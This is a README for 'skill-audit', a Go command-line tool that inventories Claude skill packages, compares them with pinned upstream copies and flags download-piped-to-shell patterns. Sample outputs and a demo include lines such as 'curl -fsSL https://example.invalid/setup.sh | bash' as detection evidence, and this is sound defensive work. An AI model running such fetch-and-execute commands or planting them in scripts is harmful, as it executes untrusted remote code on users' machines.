# Skill Audit

A small Go CLI for the Traceforce take-home. It finds Claude skills (`SKILL.md` packages) on a machine and matches them against pinned skills from [anthropics/skills](https://github.com/anthropics/skills). It shows which files of a copied skill differ from upstream and flags downloaded scripts piped into a shell. It reads files as data, never executes them, and needs no network for the core workflow. It is an on-demand inventory and detection tool; it does not monitor running agents or enforce policy.

## Build

Requires Go 1.23 or later. Dependencies are vendored, so the build works offline.

```sh
go build -o ./bin/skill-audit ./cmd/skill-audit
./bin/skill-audit --version
```

Once this repository is published, `go install github.com/nathanhuh/skill-audit/cmd/skill-audit@latest` also works; that path fetches dependencies over the network.

## Quick start: one command

From any project folder:

```sh
cd ~/code/my-project
skill-audit scan
```

`scan` inventories your global Claude skills (`~/.claude`) and the project skills under the current folder, audits them offline, and saves `inventory.json` and `report.json` in a new folder under `~/.skill-audit/reports/`. Run it from a parent folder such as `~/code` to cover several projects at once. It never changes your skills, never records history and never uses the network ([ADR-0016](docs/adr/0016-one-command-scan.md)). Output from a fixture home, with paths shortened:

```text
scan roots=["~/.claude" "~/code/app"]
audit skills=2 complete=true discovery_complete=true
global "~/.claude/skills/brand-guidelines" correlation=exact lineage=not_compared
candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/brand-guidelines" basis="observed_exact_match" score=1.000 shared=0 union=0
project "~/code/app/.claude/skills/deploy" correlation=unknown lineage=not_compared
scanner=skill-audit version="SA001/v3;sh/v3.10.0;scope/v2;identity/v2" status=completed_with_findings message="" analyzed=1 outside_scope=1
skill-audit/"SA001" high "scripts/setup.sh":1 change=not_compared evidence="curl -fsSL https://example.invalid/setup.sh | bash"
summary skills=2 global=1 project=1 machine=0 exact=1 possible_modified=0 ambiguous=0 unknown=1 findings=1 complete=true
saved inventory="~/.skill-audit/reports/20261030T005832Z/inventory.json" report="~/.skill-audit/reports/20261030T005832Z/report.json"
```

Run from your home folder, `scan` covers only `~/.claude` and says how to include projects. The exit codes are the [audit's](#exit-codes); here `1` because of the finding.

## 60-second demo

```sh
sh scripts/demo.sh
```

The demo builds the CLI and creates a temporary home with one global skill and one project skill, both copied from the bundled upstream references. It records a baseline, appends `curl … | bash` to a bundled script, then audits again. Output of the final audit, with paths shortened:

```text
audit skills=2 complete=true discovery_complete=true
global ".../home/.claude/skills/brand-guidelines" correlation=exact lineage=unchanged
candidate="brand-guidelines" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/brand-guidelines" basis="observed_exact_match" score=1.000 shared=0 union=0
project ".../projects/one/.claude/skills/web-artifacts-builder" correlation=possible_modified lineage=changed
candidate="web-artifacts-builder" repository="https://github.com/anthropics/skills" commit="dbd4588f9e1033efb41dad4bef2f7947c8993d44" upstream_path="skills/web-artifacts-builder" basis="inferred_candidate" score=0.996 shared=245 union=246
upstream_modified="scripts/bundle-artifact.sh"
modified="scripts/bundle-artifact.sh"
scanner=skill-audit version="SA001/v3;sh/v3.10.0;scope/v2;identity/v2" status=completed_with_findings message="" analyzed=2 outside_scope=3
skill-audit/"SA001" high "scripts/bundle-artifact.sh":55 change=new evidence="curl -fsSL https://example.invalid/install.sh | bash"
summary skills=2 global=1 project=1 machine=0 exact=1 possible_modified=1 ambiguous=0 unknown=0 findings=1 complete=true
recording=recorded path=".../state.json" message="observation saved"
```

The demo touches nothing outside its temporary directory, and it exits 0 only if this audit reported the finding (exit 1).

## Custom scans: inventory and audit

`scan` is a fixed recipe. For other roots, output names, a recorded baseline or Skill X-Ray, run the two steps yourself. Work from an ordinary folder outside the roots you scan. Output paths must not pass through a symlink, and on macOS `/tmp` and `/var` (including `mktemp -d` folders) are symlinks, so outputs written there are refused.

```sh
mkdir -p ~/skill-audit-run && cd ~/skill-audit-run
skill-audit inventory --root ~/.claude --root ~/code --out inventory.json
skill-audit audit --inventory inventory.json --out report.json
```

`inventory` and `audit` only read your skills; the only files written are the ones you name. Packages under your home's agent directories (including plugin installs) are `global`; packages inside a project's `.claude/skills` or `.agents/skills` are `project`; anything else is `machine`. If coverage comes back `complete=false`, the grouped diagnostics name the cause, usually symlinks or unreadable folders under a root; narrow `--root` to the folders that hold skills. Running `inventory` with no `--root` scans the whole device, which can exhaust its entry budget in caches before it reaches your projects, so start with explicit roots.

Text output is a summary that ends with a `summary skills=… findings=… complete=…` line; the JSON report (`--out report.json` or `--json`) keeps every skill, evaluation and diagnostic ([ADR-0015](docs/adr/0015-text-output-summary.md)). For example, with `jq`:

```sh
jq -r '.skills[] | "\(.scope)\t\(.correlation.status)"' report.json | sort | uniq -c
jq '.skills[] | select(.correlation.status != "unknown") | {scope, path, status: .correlation.status}' report.json
jq '.skills[] | select(.findings | length > 0) | {path, findings}' report.json
```

To track changes over time, record a baseline, then audit again later with a fresh inventory:

```sh
skill-audit audit --inventory inventory.json --state state.json --record baseline
skill-audit audit --inventory inventory.json --state state.json            # compare
skill-audit audit --inventory inventory.json --state state.json --record snapshot
```

Keep the state file outside the roots you scan, or pass the same `--state` to `inventory` so it is excluded from discovery.

## Brief coverage

| Brief requirement | How | Shown by |
| --- | --- | --- |
| 1. Discover global and project-level Claude skills on the device | `inventory` classifies every `SKILL.md` package as `global`, `project` or `machine` by installation ownership | Demo; [ADR-0002](docs/adr/0002-local-identity-and-installation-ownership.md), [ADR-0003](docs/adr/0003-discovery-and-exclusion-policy.md) |
| 2. Correlate against 2–3 skills from anthropics/skills | Two skills pinned to commit `dbd4588` are embedded; `audit` reports `exact`, `possible_modified` (content similarity, names ignored), `ambiguous` or `unknown` | Demo; [Catalog fixtures and matching](DESIGN.md#catalog-fixtures-and-matching) |
| 3. Track lineage: pulled from open source, then modified | Each modified candidate lists files changed relative to the pinned upstream reference, with no baseline needed (`upstream_modified=`); `--record baseline\|snapshot` adds changes relative to your own recorded observation (`modified=`) | Demo; [ADR-0014](docs/adr/0014-upstream-file-comparison.md), [ADR-0004](docs/adr/0004-observations-and-baselines.md) |
| 4. One security-relevant finding type | SA001: a downloaded script piped into `sh`/`bash` (`curl … \| bash`), parsed rather than executed, with file, line and evidence | Demo; [SA001 v3 coverage](docs/reference.md#sa001-v3-coverage) |

Optional extras: `search` and `sync` import more upstream references over the network, and `audit --xray` runs the external Skill X-Ray scanner. Neither is needed for the brief. See [docs/reference.md](docs/reference.md).

## Exit codes

| Code | Meaning |
| --- | --- |
| `0` | No findings and complete coverage of the selected scope |
| `1` | Security findings (takes priority over everything else) |
| `2` | No findings, but coverage was incomplete, an operation failed, or a save's durability is unconfirmed |
| `3` | No findings, but a requested `--record` failed before saving |

## Limitations

- The built-in catalog holds two upstream skills. A copy of any other skill reports `unknown`, which is not a safety verdict; `sync` can import more references.
- SA001 is one static pattern (download piped into a shell). It is not a malware scanner, and an exact upstream match is not a guarantee of safety.
- Discovery finds packages on disk, not what an agent actually loads. Symlinks are not followed; they are reported as coverage gaps.
- Verified natively on macOS only. Linux and Windows builds cross-compile, but have not been run natively. The Skill X-Ray adapter has not been run against the real scanner.
- No runtime monitoring, policy enforcement or cloud integration.

## Testing

```sh
go test ./...
go vet ./...
```

Tests use temporary fixtures and fake HTTP handlers; no network, credentials or installed scanner are needed. Every accepted ADR scenario maps to a named test in [scenario-tests.json](docs/adr/scenario-tests.json), and the suite fails if a mapping is missing. [VERIFICATION.md](VERIFICATION.md) records exact commands and results.

## Where to look next

- [CORE_REVIEW.md](CORE_REVIEW.md): code walkthrough, file by file.
- [docs/reference.md](docs/reference.md): full command behavior, budgets, search/sync and the Skill X-Ray adapter.
- [docs/adr/](docs/adr/README.md): the binding decisions, each with acceptance scenarios.
- [DESIGN.md](DESIGN.md), [PORTABILITY.md](PORTABILITY.md), [PRODUCT.md](PRODUCT.md): architecture, platform gaps and deferred proposals.

**Why there are seventeen ADRs for a small CLI.** Early review rounds kept redefining the same rules: what counts as complete coverage, when a baseline may be compared, which exit code wins and what may be cached. The ADRs freeze those decisions, each with acceptance scenarios that map to named tests, so later changes argue against a written rule instead of reopening it. They are the contract, not extra features; [docs/history/](docs/history/README.md) keeps the superseded review records and is not policy.

## License

skill-audit is licensed under the [Apache License 2.0](LICENSE). The bundled catalog fixtures from `anthropics/skills` keep their own Apache-2.0 license and attribution under `internal/audit/catalog/`, and vendored dependencies keep their own licenses under `vendor/`.
